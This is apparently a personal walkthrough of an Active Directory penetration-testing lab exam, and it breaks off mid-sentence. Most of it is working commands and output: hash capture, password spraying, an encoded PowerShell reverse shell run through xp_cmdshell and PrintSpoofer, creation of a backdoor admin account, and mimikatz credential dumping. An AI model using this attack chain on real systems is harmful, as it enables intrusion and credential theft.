# Exam part 2

Once in the attack box let's see what is alive on the internal network using nmap:
```
nmap -sn 172.16.7.0/23
```
Which gives following result:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-11-13 11:10 EST
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0071s latency).
Nmap scan report for 172.16.7.50
Host is up (0.019s latency).
Nmap scan report for 172.16.7.60
Host is up (0.0053s latency).
Nmap scan report for 172.16.7.240 #This is the attack box
Host is up (0.039s latency).
Nmap done: 512 IP addresses (4 hosts up) scanned in 17.46 seconds
```

Beside ourselves we see three machines of interest, let's look more closely:

```
nmap 172.16.7.50 -A

Host is up (0.051s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-13T16:21:15+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-11-12T15:59:50
|_Not valid after:  2026-05-14T15:59:50
|_ssl-date: 2025-11-13T16:21:20+00:00; +1m24s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-13T16:21:14
|_  start_date: N/A
|_clock-skew: mean: 1m23s, deviation: 0s, median: 1m23s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:37:1e (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.05 seconds
```

And 

```
nmap 172.16.7.60 -A

Starting Nmap 7.92 ( https://nmap.org ) at 2025-11-13 11:21 EST
Nmap scan report for 172.16.7.60
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-11-13T16:23:02+00:00; +1m23s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-13T15:59:58
|_Not valid after:  2055-11-13T15:59:58
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m22s, deviation: 0s, median: 1m22s
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:29:33 (VMware)
| smb2-time: 
|   date: 2025-11-13T16:22:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.53 seconds
```

```
nmap 172.16.7.3 -A

Starting Nmap 7.92 ( https://nmap.org ) at 2025-11-13 11:23 EST
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.070s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 16:25:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m22s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:39:7a (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-13T16:25:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds
```

Using the following command we find plenty of users in the domain
```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 jsmith.txt -o valid_ad_users
```
The `jsmith` wordlist is obtained from here: `https://github.com/insidetrust/statistically-likely-usernames`

Found usernames:
```
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       gdavis@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       mrichardson@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       mharrison@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       tgarcia@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jmay@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       bross@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jmontgomery@INLANEFREIGHT.LOCAL
2025/11/13 11:25:24 >  [+] VALID USERNAME:       jhopkins@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       dpayne@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       mhicks@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       adunn@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       lmatthews@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       avazquez@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       mlowe@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       jmcdaniel@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       csteele@INLANEFREIGHT.LOCAL
2025/11/13 11:25:25 >  [+] VALID USERNAME:       mmullins@INLANEFREIGHT.LOCAL
2025/11/13 11:25:26 >  [+] VALID USERNAME:       mochoa@INLANEFREIGHT.LOCAL
2025/11/13 11:25:26 >  [+] VALID USERNAME:       aslater@INLANEFREIGHT.LOCAL
2025/11/13 11:25:26 >  [+] VALID USERNAME:       ehoffman@INLANEFREIGHT.LOCAL
2025/11/13 11:25:26 >  [+] VALID USERNAME:       ehamilton@INLANEFREIGHT.LOCAL
2025/11/13 11:25:27 >  [+] VALID USERNAME:       cpennington@INLANEFREIGHT.LOCAL
2025/11/13 11:25:27 >  [+] VALID USERNAME:       srosario@INLANEFREIGHT.LOCAL
2025/11/13 11:25:27 >  [+] VALID USERNAME:       lbradford@INLANEFREIGHT.LOCAL
2025/11/13 11:25:27 >  [+] VALID USERNAME:       halvarez@INLANEFREIGHT.LOCAL
2025/11/13 11:25:28 >  [+] VALID USERNAME:       gmccarthy@INLANEFREIGHT.LOCAL
2025/11/13 11:25:28 >  [+] VALID USERNAME:       dbranch@INLANEFREIGHT.LOCAL
2025/11/13 11:25:28 >  [+] VALID USERNAME:       mshoemaker@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       mholliday@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       ngriffith@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       sinman@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       minman@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       rhester@INLANEFREIGHT.LOCAL
2025/11/13 11:25:29 >  [+] VALID USERNAME:       rburrows@INLANEFREIGHT.LOCAL
2025/11/13 11:25:30 >  [+] VALID USERNAME:       dpalacios@INLANEFREIGHT.LOCAL
2025/11/13 11:25:30 >  [+] VALID USERNAME:       strent@INLANEFREIGHT.LOCAL
2025/11/13 11:25:31 >  [+] VALID USERNAME:       fanthony@INLANEFREIGHT.LOCAL
2025/11/13 11:25:31 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
2025/11/13 11:25:31 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2025/11/13 11:25:31 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2025/11/13 11:25:32 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2025/11/13 11:25:32 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2025/11/13 11:25:33 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2025/11/13 11:25:34 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
```

Let's try if any of these users have the `UF_DONT_REQUIRE_PREAUTH` property set so we can AS-REP roast them

```
GetNPUsers.py -usersfile user.txt -request -format hashcat -outputfile ~/ASREProastables.txt -dc-ip 172.16.7.3 'INLANEFREIGHT.LOCAL/'
```
Unfortunately no users have this set.

Let's try using responder to capture some NTLM hashes:
```
sudo responder -I ens224
```
After a while we capture a hash:
```
AB920::INLANEFREIGHT:45dce30d2ac14327:056B1B6D162EDA377B37FDFA7D34A06A:010100000000000080807217BC4DD80132C191D710D82DEC000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

Let's crack the hash:
```
john hash.txt --wordlist=rockyou.txt
```
We successfully cracked the hash, the credentials are `AB920:weasal`

We can now RDP to the target via using a tunnel:
```
ssh -L 5555:172.16.7.50:3389 htb-student@10.129.233.158
```

Let's retrieve the password policy:
```
crackmapexec smb 172.16.7.3 -u AB920 -p weasal --pass-pol
```
We find the following result:
```
SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 
SMB         172.16.7.3      445    DC01             [+] Dumping password info for domain: INLANEFREIGHT
SMB         172.16.7.3      445    DC01             Minimum password length: 1
SMB         172.16.7.3      445    DC01             Password history length: None
SMB         172.16.7.3      445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         172.16.7.3      445    DC01             
SMB         172.16.7.3      445    DC01             Password Complexity Flags: 000000
SMB         172.16.7.3      445    DC01                 Domain Refuse Password Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password Store Cleartext: 0
SMB         172.16.7.3      445    DC01                 Domain Password Lockout Admins: 0
SMB         172.16.7.3      445    DC01                 Domain Password No Clear Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password No Anon Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password Complex: 0
SMB         172.16.7.3      445    DC01             
SMB         172.16.7.3      445    DC01             Minimum password age: None
SMB         172.16.7.3      445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         172.16.7.3      445    DC01             Locked Account Duration: 30 minutes 
SMB         172.16.7.3      445    DC01             Account Lockout Threshold: None
SMB         172.16.7.3      445    DC01             Forced Log off Time: Not Set
```

Let's find all the user now that we have access to a domain account:
```
sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users
```
This spits out a huge list of users...

Now that we have a full dump of all the user, let's do a password spray attack and find weak credentials. 
Let's try: 
```
sudo crackmapexec smb 172.16.7.3 -u users.txt -p Welcome1 | grep +
```
This repo has some other likely ones: `https://github.com/insidetrust/statistically-likely-usernames/blob/master/weak-corporate-passwords/english-basic.txt`

We found the following credentials: `BR086:Welcome1`

We can RDP to MS01 via an SSH tunnel:
```
ssh -L 5555:172.16.7.50:3389 htb-student@10.129.75.80
```

Using the `BR086` account let's try to access the Department shares:
```
smbclient -U BR086@INLANEFREIGHT.LOCAL '//172.16.7.3/Department Shares'
```
We find a private folder containing a file `web.config` with below content:
```
<?xml version="1.0" encoding="utf-8"?>

<configuration> 
    <system.web>
       <membership>
           <providers>
               <add name="WebAdminMembershipProvider" type="System.Web.Administration.WebAdminMembershipProvider" />
           </providers>
       </membership>
       <httpModules>
              <add name="WebAdminModule" type="System.Web.Administration.WebAdminModule"/>
        </httpModules>
        <authentication mode="Windows"/>
        <authorization>
              <allow users="netdb"/>
        </authorization>
        <identity impersonate="true"/>
       <trust level="Full"/>
       <pages validateRequest="true"/>
       <globalization uiCulture="auto:en-US" />
           <masterDataServices>  
            <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
       </masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
  </system.web>
</configuration>
```

It seems we can authenticate to the database with following credentials: `netdb:D@ta_bAse_adm1n!`
Let's try it:
```
mssqlclient.py INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```
Using `xp_cmdshell` we can see our commands run as the user: `nt service\mssql$sqlexpress`
```
EXEC xp_cmdshell 'whoami';
```
The user is low priviledged and cannot read the flag on the `Administrator` desktop.

Using xp_cmdshell we can try to authenticate to our target box with SMB to see which user it uses:
```
EXEC xp_cmdshell 'XCOPY "\\172.16.7.240\test"'

#We get following result:
SMB] NTLMv2-SSP Client   : 172.16.7.60
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\SQL01$
[SMB] NTLMv2-SSP Hash     : SQL01$::INLANEFREIGHT:a29ce7cfea128869:D22B9B752B6FF5BA7F0F5B36E1F91369:010100000000000000507EB5E855DC01995ED114A7D59A3F000000000200080031004D004500460001001E00570049004E002D004E004200430030004C0036003300480057005900450004003400570049004E002D004E004200430030004C003600330048005700590045002E0031004D00450046002E004C004F00430041004C000300140031004D00450046002E004C004F00430041004C000500140031004D00450046002E004C004F00430041004C000700080000507EB5E855DC0106000400020000000800300030000000000000000000000000300000C1D467FD6BF1013728A46D4842BDF7FD7369162BC38FB6E91741EF0A51DA40930A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0037002E003200340030000000000000000000
```
We attempted to crack the hash but that failed.


Next let's see if we can do privilege escalation, we can see we have `SeImpersonatePrivilege` privilege:
```
EXEC xp_cmdshell 'whoami /priv'

Privilege Name                Description                               State                                                                                                                                                                                     

============================= ========================================= ========                                                                                                                                                                                  

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                                                                                                  

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                                                                                                  

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                                                   

SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                                                   
SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                                                   
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Let's try `PrintSpoofer.exe`... First we need to copy it..
Copy PrintSpoofer from VM to attack box:
```
#On VM
python -m http.server
#On attack box
wget http://10.10.15.251:8000/PrintSpoofer.exe
wget http://10.10.15.251:8000/Rubeus.exe
wget http://10.10.15.251:8000/mimikatz.exe
```
On the attack box spin up an SMB-server
```
sudo impacket-smbserver pwnd ~/my_share -smb2support -username koen -password koen
```

Then within a the SQL prompt execute the following command to copy it:
```
EXEC xp_cmdshell 'net use Z: \\172.16.7.240\pwnd koen /user:koen && Z:\PrintSpoofer.exe PrintSpoofer.exe'
``

Let's elevate privileges and then spawn an reverse shell.
First start the listener on the attack box:
```
nc -lvnp 9001
```
```
EXEC xp_cmdshell 'Z:\PrintSpoofer.exe -c "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"'
```

Now that we have a reverse shell, let's create a local admin user:
```
$Password = ConvertTo-SecureString "koen" -AsPlainText -Force; New-LocalUser -Name "koen" -Password $Password -FullName "RDP User" -Description "Local admin with RDP access";Add-LocalGroupMember -Group "Remote Desktop Users" -Member "koen";Add-LocalGroupMember -Group "Administrators" -Member "koen";Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Then let's transfer mimikatz to the box:
```
wget 10.10.15.196:8000/mimikatz.exe
Invoke-WebRequest -Uri "http://172.16.7.240:8000/mimikatz.exe" -OutFile "mimikatz.exe"
```

We can now login to the box using rdp and through use of an ssh tunnel:
```
ssh -L 5556:172.16.7.60:3389 htb-student@10.129.233.158
```

One on the destkop let's look at what is in LSASS:
```
./mimikatz
privilege::debug
sekurlsa::logonpasswords
```

We find one interesting account:
```
Authentication Id : 0 ; 223407 (00000000:000368af)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/18/2025 9:15:01 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
        msv :
         [00000003] Primary
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT
         * NTLM     : 8c9555327d95f815987c0d81238c7660
         * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
         * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
        tspkg :
        wdigest :
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Sup3rS3cur3maY5ql$3rverE
        ssp :
        credman :
```
We see the clear text password of the user `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`

We login to `MS01` with the `mssql` account (we are local admin on the machine).
Let's start `Inveigh` to see if we can capture some hashes/
```
.\Inveigh.exe
```

Sure enough we found the hash of `CT059`:
```
CT059::INLANEFREIGHT:904618C2D68DA750:8E4A296618242CA10E938FC6DC8A0288:010100000000000082805F9BA458DC018D379D1B4657D0F90000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080082805F9BA458DC010600040002000000080030003000000000000000000000000020000036EAFC5D5375944DCF954D29D7B4098D103E449798DCAE54989E3291A58001EF0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Let's see if we can crack it with john:
```
john hash.txt --wordlist=rockyou.txt
```
We cracked it s



#Other shit I tried:

First export the tickets:
```
./mimikatz.exe
sekurlsa::tickets /export
```

Then use the ticket:
```
.\Rubeus.exe ptt /ticket:C:\temp\mssqlsvc.kirbi
#Now let's psexec to the host as mssqlsvc
.\PsExec.exe \\MS01 powershell
#We can now retrieve the requested flag
```

Next we need the hash for user CT059... Maybe it is in LSASS of the MS01 server? Let's check...
Again create a local admin user on MS01 similar to before on the other machine:
````
$Password = ConvertTo-SecureString "koen" -AsPlainText -Force; New-LocalUser -Name "koen" -Password $Password -FullName "RDP User" -Description "Local admin with RDP access";Add-LocalGroupMember -Group "Remote Desktop Users" -Member "koen";Add-LocalGroupMember -Group "Administrators" -Member "koen";Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

We can also convert the .kirbi ticket so we can use it from our attack box:
```
ticketConverter.py mssqlsvc.kirbi mssqlsvc.ccache
```
Do the following on the attack box
```
export KRB5CCNAME=~/my_share/mssqlsvc.ccache
#Then add this in the /etc/krb5.conf file
[realms]
    INLANEFREIGHT.LOCAL = {
                kdc = 172.16.7.3      
            admin_server = 172.16.7.3
    }
```

KRB5CCNAME=~/my_share/mssqlsvc.ccache secretsdump.py -k -no-pass INLANEFREIGHT.LOCAL/mssqlsvc@172.16.7.50
